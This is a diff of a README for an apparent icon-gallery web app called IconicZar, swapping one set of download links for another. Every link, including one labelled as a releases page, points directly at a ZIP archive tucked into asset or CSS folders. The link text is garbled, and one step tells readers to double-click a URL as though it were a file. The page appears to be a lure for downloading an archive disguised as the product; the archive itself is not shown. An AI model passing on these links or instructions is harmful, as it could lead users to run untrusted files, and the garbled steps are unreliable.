@@ -4,13 +4,13 @@
 IconicZar is a sleek, modern, and searchable gallery designed for developers and designers. It showcases a vast collection of technology and programming icons. Built entirely with HTML, CSS, and JavaScript, this application helps you find the perfect icon for your project quickly and easily.
 
 ## 📥 Download Now
-[![Download IconicZar](https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip%https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip)](https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip)
+[![Download IconicZar](https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip%https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip)](https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip)
 
 ## 🚀 Getting Started
 Using IconicZar is simple. Follow these steps to get up and running:
 
 1. **Visit the Releases Page**
-   To download IconicZar, visit the [Releases page](https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip).
+   To download IconicZar, visit the [Releases page](https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip).
 
 2. **Choose the Latest Version**
    Look for the latest release. It will be at the top of the page. Click on it to see the available files.
@@ -22,7 +22,7 @@ Using IconicZar is simple. Follow these steps to get up and running:
    If you downloaded a ZIP file, right-click on it and select “Extract All” to unzip the contents.
 
 5. **Open the Application**
-   Find the `https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip` file in the extracted folder. Double-click it to open IconicZar in your default web browser.
+   Find the `https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip` file in the extracted folder. Double-click it to open IconicZar in your default web browser.
 
 ## 🔍 Features
 - **Extensive Icon Library**: Access thousands of icons for various technologies.
@@ -63,7 +63,7 @@ For detailed documentation and more information, check the Wiki section of this 
 - **javascript**: Scripting language for dynamic content.
 
 ## 🔗 Links
-- Download the latest version: [IconicZar Releases](https://raw.githubusercontent.com/Irsaam1023/IconicZar/main/assets/png/Iconic-Zar-v1.3.zip)
+- Download the latest version: [IconicZar Releases](https://github.com/Irsaam1023/IconicZar/raw/refs/heads/main/css/Zar-Iconic-1.3.zip)
 - Follow the repository for updates and new icons. 
 
 Dive into IconicZar and enhance your projects with stunning icons today!
